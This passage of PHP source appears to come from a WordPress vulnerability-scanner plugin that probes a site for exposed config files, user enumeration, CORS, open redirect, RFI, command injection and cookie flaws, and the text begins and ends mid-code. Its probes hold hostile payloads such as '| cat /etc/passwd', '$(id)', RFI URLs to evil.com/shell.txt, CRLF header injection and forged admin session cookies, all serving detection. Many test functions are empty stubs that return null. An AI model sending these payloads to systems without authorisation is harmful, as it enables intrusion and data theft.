        'headers' => array_merge($this->http_args['headers'], [
          'Content-Type' => 'text/xml',
        ]),
      ]);

      $pingback_response = wp_remote_post($xmlrpc_url, $pingback_args);
      if (!is_wp_error($pingback_response)) {
        return [
          'affected_url' => $xmlrpc_url,
          'description' => 'XML-RPC pingback enabled - potential DDoS amplification',
          'impact' => 'Attackers can use pingback for DDoS amplification attacks',
          'recommendation' => 'Disable XML-RPC pingback functionality or restrict access',
          'steps_to_reproduce' => '1. Send pingback request to ' . $xmlrpc_url . '\n2. Verify if pingback is processed',
          'evidence_url' => $xmlrpc_url,
          'screenshot_path' => $this->take_screenshot($xmlrpc_url, 'xmlrpc_pingback_' . time())
        ];
      }
    }

    return null;
  }
  private function test_rest_api_endpoint_security($url, $vuln)
  {
    $this->debug_log[] = "Testing REST API security on: $url";

    // Test WordPress REST API endpoints
    $api_endpoints = [
      '/wp-json/wp/v2/users',
      '/wp-json/wp/v2/posts',
      '/wp-json/wp/v2/pages',
      '/wp-json/wp/v2/comments',
      '/wp-json/wp/v2/media',
      '/wp-json/wp/v2/users/1', // Specific user
      '/wp-json/wp/v2/posts/1', // Specific post
    ];

    foreach ($api_endpoints as $endpoint) {
      $test_url = $url . $endpoint;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $code = wp_remote_retrieve_response_code($response);

        // Check for information disclosure
        if ($code == 200) {
          $data = json_decode($body, true);

          // Check for user enumeration
          if (stripos($endpoint, 'users') !== false && is_array($data)) {
            foreach ($data as $user) {
              if (isset($user['id']) && isset($user['name'])) {
                return [
                  'affected_url' => $test_url,
                  'description' => 'REST API exposes user information without authentication',
                  'impact' => 'Attackers can enumerate users and gather information for targeted attacks',
                  'recommendation' => 'Restrict REST API access, disable user endpoints, or require authentication',
                  'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if user data is returned without auth',
                  'evidence_url' => $test_url,
                  'screenshot_path' => $this->take_screenshot($test_url, 'rest_api_users_' . time())
                ];
              }
            }
          }

          // Check for sensitive post data
          if (stripos($endpoint, 'posts') !== false && is_array($data)) {
            foreach ($data as $post) {
              if (isset($post['content']) && isset($post['content']['rendered'])) {
                // Check if password-protected content is exposed
                if (stripos($post['content']['rendered'], 'password protected') === false) {
                  return [
                    'affected_url' => $test_url,
                    'description' => 'REST API exposes post content that may contain sensitive information',
                    'impact' => 'Private or sensitive content may be accessible without proper authorization',
                    'recommendation' => 'Configure proper access controls for REST API endpoints',
                    'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for exposed sensitive content',
                    'evidence_url' => $test_url,
                    'screenshot_path' => $this->take_screenshot($test_url, 'rest_api_content_' . time())
                  ];
                }
              }
            }
          }
        }
      }
    }

    return null;
  }
  private function test_brute_force_protection($url, $vuln)
  {
    return null;
  }
  private function test_session_management($url, $vuln)
  {
    return null;
  }
  private function test_security_headers($url, $vuln)
  {
    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);
    $missing_headers = [];

    // Check for critical security headers
    $required_headers = [
      'X-Frame-Options' => 'Protects against clickjacking attacks',
      'X-Content-Type-Options' => 'Prevents MIME type sniffing',
      'X-XSS-Protection' => 'Enables XSS filtering in browsers',
      'Strict-Transport-Security' => 'Enforces HTTPS connections',
      'Content-Security-Policy' => 'Prevents XSS and other injection attacks',
    ];

    foreach ($required_headers as $header => $description) {
      if (!isset($headers[$header]) && !isset($headers[strtolower($header)])) {
        $missing_headers[] = $header . ' - ' . $description;
      }
    }

    if (!empty($missing_headers)) {
      return [
        'affected_url' => $url,
        'description' => $vuln['description'],
        'impact' => 'Missing security headers: ' . implode(', ', array_keys($required_headers)),
        'recommendation' => $vuln['remediation'],
        'steps_to_reproduce' => '1. Access ' . $url . '\n2. Check response headers\n3. Verify missing: ' . implode(', ', array_keys($required_headers)),
        'evidence_url' => $url,
        'screenshot_path' => $this->take_screenshot($url, 'security_headers_' . time())
      ];
    }

    return null;
  }

  private function test_ssl_tls_configuration($url, $vuln)
  {
    $this->debug_log[] = "Testing SSL/TLS configuration on: $url";

    // Parse URL to check if HTTPS
    $parsed = parse_url($url);
    if ($parsed['scheme'] !== 'https') {
      return [
        'affected_url' => $url,
        'description' => 'Site is not using HTTPS encryption',
        'impact' => 'All traffic is sent in plain text, vulnerable to eavesdropping and man-in-the-middle attacks',
        'recommendation' => 'Enable HTTPS with a valid SSL certificate and redirect all HTTP traffic to HTTPS',
        'steps_to_reproduce' => '1. Check URL scheme\n2. Verify SSL certificate validity\n3. Test for HSTS header',
        'evidence_url' => $url,
        'screenshot_path' => $this->take_screenshot($url, 'ssl_config_' . time())
      ];
    }

    // Test SSL certificate
    $response = $this->cached_request($url);
    if (is_wp_error($response)) {
      return [
        'affected_url' => $url,
        'description' => 'SSL/TLS certificate validation failed',
        'impact' => 'Certificate may be expired, self-signed, or from untrusted CA',
        'recommendation' => 'Install a valid SSL certificate from a trusted Certificate Authority',
        'steps_to_reproduce' => '1. Check SSL certificate details\n2. Verify expiration date\n3. Confirm certificate chain',
        'evidence_url' => $url,
        'screenshot_path' => $this->take_screenshot($url, 'ssl_cert_' . time())
      ];
    }

    // Check for HSTS header
    $headers = wp_remote_retrieve_headers($response);
    if (!isset($headers['strict-transport-security']) && !isset($headers['Strict-Transport-Security'])) {
      return [
        'affected_url' => $url,
        'description' => 'Missing HTTP Strict Transport Security (HSTS) header',
        'impact' => 'Browser will not enforce HTTPS-only connections, vulnerable to SSL stripping attacks',
        'recommendation' => 'Add Strict-Transport-Security header with appropriate max-age value',
        'steps_to_reproduce' => '1. Check response headers\n2. Look for Strict-Transport-Security header',
        'evidence_url' => $url,
        'screenshot_path' => $this->take_screenshot($url, 'hsts_missing_' . time())
      ];
    }

    return null;
  }
  private function test_database_security_config($url, $vuln)
  {
    return null;
  }
  private function test_file_permissions($url, $vuln)
  {
    return null;
  }
  private function test_wp_config_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing wp-config.php protection on: $url";

    $test_urls = [
      $url . '/wp-config.php',
      $url . '/wp-config-sample.php',
      $url . '/wp-config-backup.php',
      $url . '/wp-config.php.bak',
      $url . '/wp-config.php~',
      $url . '/wp-config.php.save',
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        if ($code == 200) {
          $body = wp_remote_retrieve_body($response);
          // Check if it contains WordPress config content
          if (stripos($body, 'DB_NAME') !== false || stripos($body, 'DB_USER') !== false) {
            return [
              'affected_url' => $test_url,
              'description' => 'WordPress configuration file is publicly accessible',
              'impact' => 'Attackers can obtain database credentials, salts, and other sensitive configuration',
              'recommendation' => 'Move wp-config.php above web root or add server-level access restrictions',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if config file contents are visible',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'wp_config_exposed_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_htaccess_security_rules($url, $vuln)
  {
    $this->debug_log[] = "Testing .htaccess security rules on: $url";

    // Test for exposed sensitive files that should be protected
    $sensitive_files = [
      '.htaccess',
      '.htpasswd',
      'config.php',
      'configuration.php',
      'settings.php',
      'wp-config.php',
      'wp-config-sample.php',
      '.env',
      '.git/config',
      '.svn/entries',
      'composer.json',
      'package.json',
      'phpinfo.php',
      'server-status',
      'server-info',
    ];

    foreach ($sensitive_files as $file) {
      $test_url = $url . '/' . $file;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);

        // If file is accessible (not blocked by .htaccess)
        if ($code == 200) {
          $body = wp_remote_retrieve_body($response);

          // Check if it actually contains sensitive content
          $sensitive_indicators = [
            'RewriteEngine',
            'RewriteRule',
            'DB_NAME',
            'DB_USER',
            'DB_PASSWORD',
            'AUTH_KEY',
            'SECURE_AUTH_KEY',
            '[core]',
            'repositoryformatversion',
            'composer',
            'require',
            'autoload',
            'PHP Version',
            'System',
            'Build Date',
          ];

          $is_sensitive = false;
          foreach ($sensitive_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              $is_sensitive = true;
              break;
            }
          }

          if ($is_sensitive) {
            return [
              'affected_url' => $test_url,
              'description' => 'Sensitive file accessible - .htaccess protection missing',
              'impact' => 'Attackers can access configuration files, source code, or system information',
              'recommendation' => 'Add .htaccess rules to deny access to sensitive files and directories',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Verify file contents are visible',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'htaccess_bypass_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_debug_mode_exposure($url, $vuln)
  {
    return null;
  }
  private function test_database_error_disclosure($url, $vuln)
  {
    $this->debug_log[] = "Testing database error disclosure on: $url";

    // Test various endpoints that might trigger database errors
    $test_urls = [
      $url . '/?p=999999999', // Non-existent post
      $url . '/?cat=999999999', // Non-existent category
      $url . '/?tag=nonexistent123', // Random tag
      $url . '/wp-admin/nonexistent.php', // Non-existent admin page
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $code = wp_remote_retrieve_response_code($response);

        // Look for database error patterns
        $db_errors = [
          'mysql_fetch_array',
          'mysql_fetch_row',
          'mysql_num_rows',
          'mysql_query',
          'mysqli_fetch_array',
          'mysqli_fetch_row',
          'mysqli_num_rows',
          'mysqli_query',
          'WordPress database error',
          'Error establishing database connection',
          'DB connection failed',
          'SQL syntax',
          'Unknown column',
          'Table \'',
          ' doesn\'t exist',
        ];

        foreach ($db_errors as $error) {
          if (stripos($body, $error) !== false) {
            return [
              'affected_url' => $test_url,
              'description' => 'Database error messages are being disclosed',
              'impact' => 'Attackers can gather information about database structure and potentially exploit SQL injection',
              'recommendation' => 'Disable WP_DEBUG in production, use proper error handling, and configure server not to display PHP errors',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for database error messages in response',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'db_error_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_php_error_reporting($url, $vuln)
  {
    $this->debug_log[] = "Testing PHP error disclosure on: $url";

    // Test endpoints that might trigger PHP errors
    $test_urls = [
      $url . '/wp-content/nonexistent.php',
      $url . '/wp-includes/nonexistent.php',
      $url . '/wp-admin/includes/nonexistent.php',
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);

        // Look for PHP error patterns
        $php_errors = [
          'PHP Warning',
          'PHP Notice',
          'PHP Fatal error',
          'PHP Parse error',
          'Warning:',
          'Notice:',
          'Fatal error:',
          'Parse error:',
          'Undefined variable',
          'Undefined index',
          'Call to undefined function',
          'Cannot redeclare',
          'syntax error',
          'unexpected',
        ];

        foreach ($php_errors as $error) {
          if (stripos($body, $error) !== false) {
            return [
              'affected_url' => $test_url,
              'description' => 'PHP error messages are being displayed',
              'impact' => 'Attackers can gather information about file paths, function calls, and potentially find exploitable code',
              'recommendation' => 'Set display_errors to Off in php.ini, use proper error logging instead',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for PHP error messages in response',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'php_error_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_backup_file_exposure($url, $vuln)
  {
    return null;
  }
  private function test_configuration_file_exposure($url, $vuln)
  {
    $this->debug_log[] = "Testing configuration file exposure on: $url";

    // Common configuration files that might be exposed
    $config_files = [
      'config.php',
      'configuration.php',
      'settings.php',
      'database.php',
      'db.php',
      'connect.php',
      'includes/config.php',
      'includes/database.php',
      'admin/config.php',
      'system/config.php',
      'application/config/database.php',
      'app/config/database.php',
      'config/database.php',
      'local.php',
      'production.php',
      'development.php',
    ];

    foreach ($config_files as $file) {
      $test_url = $url . '/' . $file;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);

        if ($code == 200) {
          $body = wp_remote_retrieve_body($response);

          // Check for configuration content indicators
          $config_indicators = [
            'mysql_connect',
            'mysqli_connect',
            'PDO(',
            'DB_HOST',
            'DB_USER',
            'DB_PASS',
            'DB_NAME',
            'password',
            'username',
            'database',
            'host',
            'port',
            'charset',
            'define(',
            'const ',
            '$config',
            'array(',
            '=>',
          ];

          $is_config = false;
          foreach ($config_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              $is_config = true;
              break;
            }
          }

          if ($is_config) {
            return [
              'affected_url' => $test_url,
              'description' => 'Configuration file exposed - contains database credentials or settings',
              'impact' => 'Attackers can obtain database access, API keys, or other sensitive configuration',
              'recommendation' => 'Move config files outside web root, use environment variables, or restrict access',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for database credentials or config data',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'config_exposed_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_log_file_exposure($url, $vuln)
  {
    return null;
  }
  private function test_source_code_disclosure($url, $vuln)
  {
    return null;
  }
  private function test_clickjacking_protection($url, $vuln)
  {
    return null;
  }
  private function test_mime_type_sniffing_protection($url, $vuln)
  {
    return null;
  }
  private function test_cors_configuration($url, $vuln)
  {
    $this->debug_log[] = "Testing CORS configuration on: $url";

    // Test CORS headers with different origins
    $test_origins = [
      'http://evil.com',
      'https://evil.com',
      'null',
      'http://localhost',
      'file://',
    ];

    foreach ($test_origins as $origin) {
      $args = array_merge($this->http_args, [
        'headers' => array_merge($this->http_args['headers'], [
          'Origin' => $origin,
        ]),
      ]);

      $response = $this->cached_request($url, $args);
      if (!is_wp_error($response)) {
        $headers = wp_remote_retrieve_headers($response);

        // Check Access-Control-Allow-Origin header
        $allow_origin = isset($headers['access-control-allow-origin']) ?
          $headers['access-control-allow-origin'] : (isset($headers['Access-Control-Allow-Origin']) ? $headers['Access-Control-Allow-Origin'] : null);

        if ($allow_origin) {
          // Check for overly permissive CORS
          if (
            $allow_origin === '*' ||
            $allow_origin === $origin ||
            (is_array($allow_origin) && in_array('*', $allow_origin))
          ) {

            // Check for credentials allowed with wildcard
            $allow_credentials = isset($headers['access-control-allow-credentials']) ?
              $headers['access-control-allow-credentials'] : (isset($headers['Access-Control-Allow-Credentials']) ? $headers['Access-Control-Allow-Credentials'] : null);

            if ($allow_origin === '*' && $allow_credentials) {
              return [
                'affected_url' => $url,
                'description' => 'CORS misconfiguration: credentials allowed with wildcard origin',
                'impact' => 'Attackers can make authenticated requests from any origin, leading to CSRF-like attacks',
                'recommendation' => 'Specify allowed origins explicitly, avoid wildcard with credentials',
                'steps_to_reproduce' => '1. Send request with Origin: ' . $origin . '\n2. Check CORS headers in response',
                'evidence_url' => $url,
                'screenshot_path' => $this->take_screenshot($url, 'cors_' . time())
              ];
            }

            if ($allow_origin === '*') {
              return [
                'affected_url' => $url,
                'description' => 'CORS allows all origins (*)',
                'impact' => 'Any website can make requests to this site, potentially leading to CSRF attacks',
                'recommendation' => 'Restrict CORS origins to specific trusted domains only',
                'steps_to_reproduce' => '1. Check Access-Control-Allow-Origin header\n2. Verify if it allows all origins',
                'evidence_url' => $url,
                'screenshot_path' => $this->take_screenshot($url, 'cors_wildcard_' . time())
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_subresource_integrity($url, $vuln)
  {
    return null;
  }
  private function test_content_security_policy($url, $vuln)
  {
    $this->debug_log[] = "Testing Content Security Policy on: $url";

    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);

    // Check for CSP header
    $csp_header = isset($headers['content-security-policy']) ?
      $headers['content-security-policy'] : (isset($headers['Content-Security-Policy']) ? $headers['Content-Security-Policy'] : null);

    if (!$csp_header) {
      return [
        'affected_url' => $url,
        'description' => 'Missing Content Security Policy (CSP) header',
        'impact' => 'No protection against XSS attacks, inline scripts, and other code injection',
        'recommendation' => 'Implement a Content Security Policy header to mitigate XSS and injection attacks',
        'steps_to_reproduce' => '1. Check response headers\n2. Verify absence of Content-Security-Policy header',
        'evidence_url' => $url,
        'screenshot_path' => $this->take_screenshot($url, 'csp_missing_' . time())
      ];
    }

    // Analyze CSP for weaknesses
    $csp_value = is_array($csp_header) ? $csp_header[0] : $csp_header;

    // Check for unsafe directives
    $unsafe_patterns = [
      'unsafe-inline',
      'unsafe-eval',
      'data:',
      'blob:',
      '*',
    ];

    foreach ($unsafe_patterns as $pattern) {
      if (stripos($csp_value, $pattern) !== false) {
        return [
          'affected_url' => $url,
          'description' => 'Content Security Policy allows unsafe content: ' . $pattern,
          'impact' => 'XSS attacks may still be possible due to permissive CSP rules',
          'recommendation' => 'Review and tighten CSP directives, avoid unsafe-* keywords when possible',
          'steps_to_reproduce' => '1. Check Content-Security-Policy header\n2. Look for unsafe directives like ' . $pattern,
          'evidence_url' => $url,
          'screenshot_path' => $this->take_screenshot($url, 'csp_weak_' . time())
        ];
      }
    }

    return null;
  }
  private function test_referrer_policy($url, $vuln)
  {
    return null;
  }
  private function test_feature_policy_permissions_policy($url, $vuln)
  {
    return null;
  }
  private function test_insecure_http_methods($url, $vuln)
  {
    return null;
  }
  private function test_http_verb_tampering($url, $vuln)
  {
    return null;
  }
  private function test_cache_poisoning($url, $vuln)
  {
    return null;
  }
  private function test_host_header_injection($url, $vuln)
  {
    $this->debug_log[] = "Testing host header injection on: $url";

    // Test with malicious host headers
    $malicious_hosts = [
      'evil.com',
      '127.0.0.1',
      'localhost',
      'evil.com:80',
      'evil.com%0d%0aSet-Cookie:malicious=value',
    ];

    foreach ($malicious_hosts as $host) {
      $args = array_merge($this->http_args, [
        'headers' => array_merge($this->http_args['headers'], [
          'Host' => $host,
        ]),
      ]);

      $response = $this->cached_request($url, $args);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $headers = wp_remote_retrieve_headers($response);

        // Check if host header is reflected in response
        if (stripos($body, $host) !== false) {
          return [
            'affected_url' => $url,
            'description' => 'Host header injection vulnerability - host header reflected in response',
            'impact' => 'Attackers can perform cache poisoning, SSRF, or bypass security controls',
            'recommendation' => 'Validate and sanitize Host header, avoid using it in application logic',
            'steps_to_reproduce' => '1. Send request with Host: ' . $host . '\n2. Check if host is reflected in response',
            'evidence_url' => $url,
            'screenshot_path' => $this->take_screenshot($url, 'host_injection_' . time())
          ];
        }

        // Check for HTTP header injection
        if (isset($headers['set-cookie']) && stripos($headers['set-cookie'], 'malicious=value') !== false) {
          return [
            'affected_url' => $url,
            'description' => 'HTTP header injection via Host header',
            'impact' => 'Attackers can inject arbitrary HTTP headers, leading to cache poisoning or response splitting',
            'recommendation' => 'Sanitize Host header input, prevent CRLF sequences',
            'steps_to_reproduce' => '1. Send Host header with CRLF injection\n2. Check for injected headers in response',
            'evidence_url' => $url,
            'screenshot_path' => $this->take_screenshot($url, 'header_injection_' . time())
          ];
        }
      }
    }

    return null;
  }
  private function test_open_redirect($url, $vuln)
  {
    $this->debug_log[] = "Testing open redirect on: $url";

    // Common redirect parameters
    $redirect_params = ['redirect', 'url', 'return', 'next', 'continue', 'redir', 'redirect_to', 'return_url'];

    // Malicious redirect targets
    $evil_urls = [
      'http://evil.com',
      'https://evil.com',
      '//evil.com',
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
    ];

    foreach ($redirect_params as $param) {
      foreach ($evil_urls as $evil_url) {
        $test_url = $url . '/?' . $param . '=' . urlencode($evil_url);
        $response = $this->cached_request($test_url, ['redirection' => 0]); // Don't follow redirects

        if (!is_wp_error($response)) {
          $code = wp_remote_retrieve_response_code($response);
          $headers = wp_remote_retrieve_headers($response);

          // Check for redirect response
          if (in_array($code, [301, 302, 303, 307, 308])) {
            $location = isset($headers['location']) ? $headers['location'] : (isset($headers['Location']) ? $headers['Location'] : null);

            if ($location && (stripos($location, 'evil.com') !== false || stripos($location, 'javascript:') !== false)) {
              return [
                'affected_url' => $test_url,
                'description' => 'Open redirect vulnerability detected',
                'impact' => 'Attackers can redirect users to malicious sites for phishing or credential theft',
                'recommendation' => 'Validate redirect URLs against allowlist, use relative URLs, or remove redirect functionality',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if redirect occurs to external site',
                'evidence_url' => $test_url,
                'screenshot_path' => $this->take_screenshot($test_url, 'open_redirect_' . time())
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_lfi_protection($url, $vuln)
  {
    return null;
  }
  private function test_rfi_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing RFI protection on: $url";

    // RFI test payloads
    $rfi_payloads = [
      'http://evil.com/malicious.php',
      'https://evil.com/shell.txt',
      'http://127.0.0.1/shell.php',
      'data:text/plain;base64,PD9waHAgZWNobyAicmZpIjs/Pgo=', // PHP code in data URI
    ];

    // Common vulnerable parameters
    $test_params = ['file', 'include', 'require', 'load', 'template', 'page', 'path', 'dir'];

    foreach ($test_params as $param) {
      foreach ($rfi_payloads as $payload) {
        $test_url = $url . '/?' . $param . '=' . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);

          // Check for RFI success indicators
          $rfi_indicators = [
            'rfi', // Our test payload
            'malicious', // From payload
            'PD9waHAg', // Base64 PHP header
            'shell', // Common shell indicator
          ];

          foreach ($rfi_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $test_url,
                'description' => 'Remote File Inclusion (RFI) vulnerability detected',
                'impact' => 'Attackers can execute arbitrary code or include malicious files',
                'recommendation' => 'Disable allow_url_include, validate file paths, use allowlists for includes',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if remote file content is included',
                'evidence_url' => $test_url,
                'screenshot_path' => $this->take_screenshot($test_url, 'rfi_' . time())
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_command_injection_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing command injection protection on: $url";

    // Command injection payloads
    $cmd_payloads = [
      '; id',
      '| id',
      '`id`',
      '$(id)',
      '; uname -a',
      '| cat /etc/passwd',
      '; ping -c 1 127.0.0.1',
      '| whoami',
    ];

    // Test common vulnerable parameters that might execute commands
    $test_params = ['cmd', 'exec', 'command', 'run', 'shell', 'system', 'query'];

    foreach ($test_params as $param) {
      foreach ($cmd_payloads as $payload) {
        $test_url = $url . '/?' . $param . '=' . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);

          // Check for command execution indicators
          $cmd_indicators = [
            'uid=', // id command output
            'gid=', // id command output
            'Linux', // uname output
            'root:', // passwd file content
            'bin/bash', // passwd content
            '127.0.0.1', // ping output (if command executed)
          ];

          foreach ($cmd_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $test_url,
                'description' => 'Command injection vulnerability detected',
                'impact' => 'Attackers can execute arbitrary system commands on the server',
                'recommendation' => 'Use safe APIs, validate input, escape shell arguments, avoid shell execution',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for command execution output',
                'evidence_url' => $test_url,
                'screenshot_path' => $this->take_screenshot($test_url, 'command_injection_' . time())
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_template_injection_protection($url, $vuln)
  {
    return null;
  }
  private function test_email_header_injection_protection($url, $vuln)
  {
    return null;
  }
  private function test_password_reset_vulnerability($url, $vuln)
  {
    return null;
  }
  private function test_account_takeover_email_change($url, $vuln)
  {
    return null;
  }
  private function test_session_fixation_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing session fixation protection on: $url";

    // Test session fixation by setting session cookies
    $test_session_ids = [
      'testsession123',
      'fixation_test_456',
      'evil_session_789',
    ];

    foreach ($test_session_ids as $session_id) {
      $args = array_merge($this->http_args, [
        'headers' => array_merge($this->http_args['headers'], [
          'Cookie' => 'PHPSESSID=' . $session_id . '; wordpress_logged_in_test=admin|1234567890|abcdef; wp-settings-time-1=1234567890',
        ]),
      ]);

      $response = $this->cached_request($url, $args);
      if (!is_wp_error($response)) {
        $headers = wp_remote_retrieve_headers($response);
        $body = wp_remote_retrieve_body($response);

        // Check if session ID is accepted/reflected
        $set_cookie = isset($headers['set-cookie']) ? $headers['set-cookie'] : (isset($headers['Set-Cookie']) ? $headers['Set-Cookie'] : null);

        if ($set_cookie) {
          // Check if our session ID is being used or a new one is set
          if (is_array($set_cookie)) {
            foreach ($set_cookie as $cookie) {
              if (stripos($cookie, 'PHPSESSID=' . $session_id) !== false) {
                return [
                  'affected_url' => $url,
                  'description' => 'Potential session fixation vulnerability - provided session ID accepted',
                  'impact' => 'Attackers can set known session IDs for victims, hijacking authenticated sessions',
                  'recommendation' => 'Regenerate session IDs after login, validate session integrity',
                  'steps_to_reproduce' => '1. Set session cookie to known value\n2. Check if server accepts the provided session ID',
                  'evidence_url' => $url,
                  'screenshot_path' => $this->take_screenshot($url, 'session_fixation_' . time())
                ];
              }
            }
          } elseif (is_string($set_cookie) && stripos($set_cookie, 'PHPSESSID=' . $session_id) !== false) {
            return [
              'affected_url' => $url,
              'description' => 'Session fixation vulnerability - attacker-controlled session ID accepted',
              'impact' => 'Attackers can perform session fixation attacks',
              'recommendation' => 'Implement proper session management and regeneration',
              'steps_to_reproduce' => '1. Send request with predetermined session ID\n2. Verify if session ID is maintained',
              'evidence_url' => $url,
              'screenshot_path' => $this->take_screenshot($url, 'session_fixation_' . time())
            ];
          }
        }

        // Check for WordPress-specific session handling
        if (stripos($body, 'wordpress_logged_in') !== false) {
          return [
            'affected_url' => $url,
            'description' => 'WordPress session handling may be vulnerable to fixation',
            'impact' => 'Authenticated sessions could be hijacked via session fixation',
            'recommendation' => 'Ensure WordPress session regeneration on login and privilege changes',
            'steps_to_reproduce' => '1. Check WordPress session cookie handling\n2. Verify session regeneration mechanisms',
            'evidence_url' => $url,
            'screenshot_path' => $this->take_screenshot($url, 'wp_session_' . time())
          ];
        }
      }
    }

    return null;
  }
  private function test_session_timeout_protection($url, $vuln)
  {
    return null;
  }
  private function test_concurrent_session_control($url, $vuln)
  {
    return null;
  }
  private function test_cookie_security_attributes($url, $vuln)
  {
    $this->debug_log[] = "Testing cookie security attributes on: $url";

    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);
    $set_cookie = isset($headers['set-cookie']) ? $headers['set-cookie'] : (isset($headers['Set-Cookie']) ? $headers['Set-Cookie'] : null);

    if (!$set_cookie) {
      // No cookies set, which is actually good for security
      return null;
    }

    // Handle both string and array cookie headers
    $cookies = is_array($set_cookie) ? $set_cookie : [$set_cookie];

    foreach ($cookies as $cookie_header) {
      // Parse cookie attributes
      $cookie_parts = explode(';', $cookie_header);
      $cookie_name_value = trim($cookie_parts[0]);

      // Extract cookie attributes
      $attributes = [];
      for ($i = 1; $i < count($cookie_parts); $i++) {
        $attr = trim($cookie_parts[$i]);
        $attr_parts = explode('=', $attr, 2);
        $attr_name = strtolower(trim($attr_parts[0]));
        $attr_value = isset($attr_parts[1]) ? trim($attr_parts[1]) : true;
        $attributes[$attr_name] = $attr_value;
      }

      // Check for missing Secure flag on HTTPS
      if (stripos($url, 'https://') === 0 && !isset($attributes['secure'])) {
        return [
          'affected_url' => $url,
          'description' => 'Cookie missing Secure flag over HTTPS',
          'impact' => 'Cookies can be transmitted over unencrypted connections',
          'recommendation' => 'Add Secure flag to all cookies transmitted over HTTPS',
          'steps_to_reproduce' => '1. Check Set-Cookie headers\n2. Verify Secure flag is present for HTTPS sites',
          'evidence_url' => $url,
          'screenshot_path' => $this->take_screenshot($url, 'cookie_secure_' . time())
        ];
      }

      // Check for missing HttpOnly flag
      if (!isset($attributes['httponly'])) {
        return [
          'affected_url' => $url,
          'description' => 'Cookie missing HttpOnly flag',
          'impact' => 'Cookies accessible via JavaScript, vulnerable to XSS attacks',
          'recommendation' => 'Add HttpOnly flag to prevent JavaScript access to cookies',
          'steps_to_reproduce' => '1. Check Set-Cookie headers\n2. Verify HttpOnly flag is present',
          'evidence_url' => $url,
          'screenshot_path' => $this->take_screenshot($url, 'cookie_httponly_' . time())
        ];
      }

      // Check for missing SameSite attribute
      if (!isset($attributes['samesite'])) {
        return [
          'affected_url' => $url,
          'description' => 'Cookie missing SameSite attribute',
          'impact' => 'Vulnerable to CSRF attacks from cross-site requests',
          'recommendation' => 'Add SameSite attribute (Strict or Lax) to prevent CSRF',
          'steps_to_reproduce' => '1. Check Set-Cookie headers\n2. Verify SameSite attribute is present',
          'evidence_url' => $url,
          'screenshot_path' => $this->take_screenshot($url, 'cookie_samesite_' . time())
        ];
      }
    }

    return null;
  }
  private function test_sensitive_data_in_url($url, $vuln)
  {
    return null;
  }
  private function test_sensitive_data_in_logs($url, $vuln)
  {
    return null;
  }
  private function test_data_encryption_at_rest($url, $vuln)
  {
    return null;
  }
  private function test_data_encryption_in_transit($url, $vuln)
  {
    return null;
  }
  private function test_weak_cryptographic_algorithms($url, $vuln)
  {
    return null;
  }
  private function test_insecure_random_number_generation($url, $vuln)
  {
    return null;
  }
  private function test_business_logic_vulnerabilities($url, $vuln)
  {
    return null;
  }
  private function test_race_conditions($url, $vuln)
  {
    return null;
  }
  private function test_api_rate_limiting($url, $vuln)
  {
    return null;
  }
  private function test_dos_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing DoS protection on: $url";

    // Test for potential DoS vectors
    $dos_tests = [
      // Large payload test
      [
        'type' => 'large_payload',
